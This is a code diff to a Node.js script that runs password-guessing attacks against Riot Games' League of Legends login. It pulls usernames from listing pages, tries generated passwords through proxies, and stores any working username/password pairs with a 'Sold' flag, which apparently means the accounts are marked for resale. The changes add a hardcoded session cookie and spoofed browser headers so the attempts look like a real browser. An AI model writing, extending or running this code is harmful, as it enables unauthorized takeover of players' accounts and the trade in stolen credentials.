@@ -1,6 +1,7 @@
 /* eslint-disable no-await-in-loop */
 const { uuid } = require('uuidv4');
 const HttpsProxyAgent = require('https-proxy-agent');
+const { Cookie, CookieJar } = require('tough-cookie');
 
 const { NODE_ENV, RIOT_AUTH_URL, TEST_INTERVAL } = require('../commons/env');
 const { getNNumbers } = require('../commons/numbers');
@@ -20,46 +21,84 @@ const requestInterval = 1000;
 const minPageNum = 13;
 const states = urls.map((url, i) => ({ url, pageNum: minPageNum + i, lastUsers: [] }));
 let lastProxy = null;
-
-const authorize = async proxy => {
-  // const { host, port } = proxy;
-  const response = await axios({
-    options: {
-      method: 'post',
-      url: RIOT_AUTH_URL,
-      withCredentials: true,
-      // proxy: { host, port, protocol: 'https' },
-      // httpsAgent: new HttpsProxyAgent(`http://${host}:${port}`),
-      headers: { 'Content-Type': 'application/json' },
-      data: {
-        client_id: 'rso-web-client-prod',
-        login_hint: 'las',
-        redirect_uri: 'https://login.leagueoflegends.com/oauth2-callback',
-        response_type: 'code',
-        scope: 'openid',
-        state: uuid()
-      }
-    },
-    persist: true
+const cookieHeader =
+  '_ga=GA1.2.1863859218.1595491280; _gid=GA1.2.2059473310.1595491280; did=bfb4c5639e53489b9f762ca1ec601e0b; __cfduid=d0df7d2a3d3e2e095ee429f55593370a11595491831; clid=uw1; asid=IGz-OmcPPpCrV7uGCtmP8yoaWigdIbAcfMFiY9sQ1t4.3f4TIYoqfWQ%3D; __cf_bm=3a11c10e705526e8683f4d84e13c7128abe6491b-1595522248-1800-AfncLqFTGUon/FzjeiSb5ob+aa4d6FUt6JoXC2Gm7fTtzrO5p/8z4AJAwHpXhYwwwUmTEL2pjgdzCgWMnjV0R3s';
+const getCookie = async proxy =>
+  new Promise(async resolve => {
+    // const { host, port } = proxy;
+    const response = await axios({
+      options: {
+        method: 'post',
+        url: RIOT_AUTH_URL,
+        withCredentials: true,
+        // proxy: { host, port, protocol: 'https' },
+        // httpsAgent: new HttpsProxyAgent(`http://${host}:${port}`),
+        headers: {
+          'Content-Type': 'application/json',
+          Accept: '*/*',
+          'Accept-Encoding': 'gzip, deflate, br',
+          'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
+          Cookie: cookieHeader,
+          Referrer: 'https://auth.riotgames.com/login',
+          'Sec-Fetch-Dest:': 'empty',
+          'Sec-Fetch-Mode': 'cors',
+          'Sec-Fetch-Site': 'same-origin',
+          'User-Agent':
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
+        },
+        data: {
+          client_id: 'rso-web-client-prod',
+          login_hint: 'las',
+          redirect_uri: 'https://login.leagueoflegends.com/oauth2-callback',
+          response_type: 'code',
+          scope: 'openid',
+          state: uuid()
+        }
+      },
+      persist: true
+    });
+    if (!response) return resolve(null);
+    // TODO remove
+    if (true === true) return resolve(response.headers['set-cookie'][0]);
+    console.log('POST got', response.status);
+    const cookie = Cookie.parse(response.headers['set-cookie'][0]);
+    cookie.value = uuid();
+    const cookiejar = new CookieJar();
+    cookiejar.setCookie(cookie, RIOT_AUTH_URL, (error, data) => {
+      if (error) rollbar.error(error);
+      console.log(cookiejar);
+      resolve(cookiejar);
+    });
   });
-  console.log('POST got', response.status);
-};
 const changeProxy = async () => {
   const proxy = getProxy();
   const { host, port } = getProxyInfo(proxy);
   if (proxy !== lastProxy) {
     lastProxy = proxy;
-    await authorize(proxy);
+    await getCookie(proxy);
   }
   return { host, port, protocol: 'http' };
 };
-const testCredentials = async (url, username, password, proxyConfig) => {
+const testCredentials = async (url, username, password, proxyConfig, cookie) => {
   const options = {
     method: 'put',
     url: RIOT_AUTH_URL,
     withCredentials: true,
     proxy: proxyConfig,
-    headers: { 'Content-Type': 'application/json' },
+    headers: {
+      'Content-Type': 'application/json',
+      Accept: 'application/json',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'accept-Language': 'en-US,en;q=0.9,es;q=0.8',
+      Cookie: cookieHeader,
+      Origin: 'https://auth.riotgames.com',
+      Referrer: 'https://auth.riotgames.com/login',
+      'Sec-Fetch-Dest:': 'empty',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Site': 'same-origin',
+      'User-Agent':
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
+    },
     data: {
       language: 'es-ES',
       password,
@@ -69,8 +108,8 @@ const testCredentials = async (url, username, password, proxyConfig) => {
     }
   };
   const response = await axios({ options, persist: true });
-  console.log('PUT got', response.status);
   if (!response || response.status < 200 || response.status >= 300) return;
+  console.log('PUT got', response.status);
   account.save({
     UserName: username,
     Password: password,
@@ -78,7 +117,7 @@ const testCredentials = async (url, username, password, proxyConfig) => {
     Sold: false
   });
 };
-const requestUsers = async (url, state) => {
+const requestUsers = async (url, state, cookie) => {
   console.log('GET', url);
   // User list request
   const userResp = await axios({ options: { url } });
@@ -99,7 +138,7 @@ const requestUsers = async (url, state) => {
     const passwords = getPasswordSet(user);
     // const proxyConfig = await changeProxy();
     for (let ii = 0; ii < passwords.length; ii += 1) {
-      setTimeout(testCredentials, time, url, user, passwords[ii], undefined);
+      setTimeout(testCredentials, time, url, user, passwords[ii], undefined, cookie);
       time += requestInterval;
     }
   }
@@ -108,15 +147,15 @@ const requestUsers = async (url, state) => {
 const execute = () =>
   setTimeout(async () => {
     const pages = getNNumbers(urls.length - 1);
-    await authorize({});
+    const cookie = await getCookie({});
     for (let i = 0; i < states.length; i += 1) {
       const state = states[i];
       const { pageNum, lastUsers } = states[i];
       const url = `${states[i].url}${states[i].pageNum}`;
-      requestUsers(url, state);
+      requestUsers(url, state, cookie);
     }
     execute();
   }, interval);
 
-if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
+// if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
 // execute();
